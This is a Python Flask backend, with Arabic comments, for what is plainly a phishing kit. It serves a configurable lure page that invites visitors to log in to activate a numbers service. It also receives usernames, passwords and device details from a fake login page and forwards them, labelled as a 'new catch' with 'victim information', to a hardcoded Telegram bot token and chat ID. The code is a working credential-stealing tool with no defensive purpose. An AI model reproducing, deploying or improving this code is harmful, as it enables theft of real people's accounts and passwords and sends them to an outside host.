from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# --- إعدادات البوت (تأكد من صحتها) ---
TOKEN = "8713127522:AAGfj4acg204MMcOSX7koJNtP4fwN9L-1YQ"
CHAT_ID = "7984067238"

# تخزين الإعدادات الافتراضية للوحة التحكم
latest_config = {
    "image": "https://telegra.ph/file/1792945d7d91986420551.jpg",
    "letter": "سجل دخولك لتفعيل خدمة الأرقام",
    "button": "تفعيل الآن"
}

@app.route('/api/save', methods=['POST'])
def save_data():
    global latest_config
    try:
        data = request.json
        
        # 1. التحقق إذا كان الطلب قادم من لوحة التحكم لتحديث الإعدادات
        if 'image' in data and 'letter' in data:
            latest_config = data
            return jsonify({"status": "success"}), 200
        
        # 2. استخراج البيانات القادمة من صفحة تسجيل الدخول (login.html)
        # ملاحظة: استخدمنا اختصارات (u, p, d, b, t) لتسريع الإرسال وتجنب الأخطاء
        user = data.get('u', 'غير معروف')
        pw = data.get('p', 'غير معروف')
        device = data.get('d', 'غير معروف')
        battery = data.get('b', 'N/A')
        time_now = data.get('t', 'غير محدد')

        # 3. صياغة الرسالة النهائية بتنسيق "الجدول المرتب"
        full_message = (
            "🚀 **إشعار: صيد جديد مـكتمل** 🚀\n"
            "━━━━━━━━━━━━━━━\n"
            "👤 **بيانات تسجيل الدخول:**\n"
            f"📧 المستخدم: `{user}`\n"
            f"🔑 كلمة السر: `{pw}`\n"
            "━━━━━━━━━━━━━━━\n"
            "📱 **معلومات الضحية:**\n"
            f"🖥️ الجهاز: {device}\n"
            f"🔋 البطارية: {battery}\n"
            "━━━━━━━━━━━━━━━\n"
            f"⏰ الوقت: {time_now}\n"
            "━━━━━━━━━━━━━━━"
        )

        # 4. إرسال الرسالة إلى تلجرام باستخدام Markdown للتنسيق
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": full_message,
            "parse_mode": "Markdown"
        }
        
        requests.post(url, json=payload)

        return jsonify({"status": "success"}), 200

    except Exception as e:
        # في حال حدوث أي خطأ برمجتة
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/get', methods=['GET'])
def get_config():
    # دالة لإرسال الإعدادات الحالية لصفحة الـ HTML
    return jsonify(latest_config)

# تعريف الـ handler لمنصة Vercel
def handler(environ, start_response):
    return app(environ, start_response)
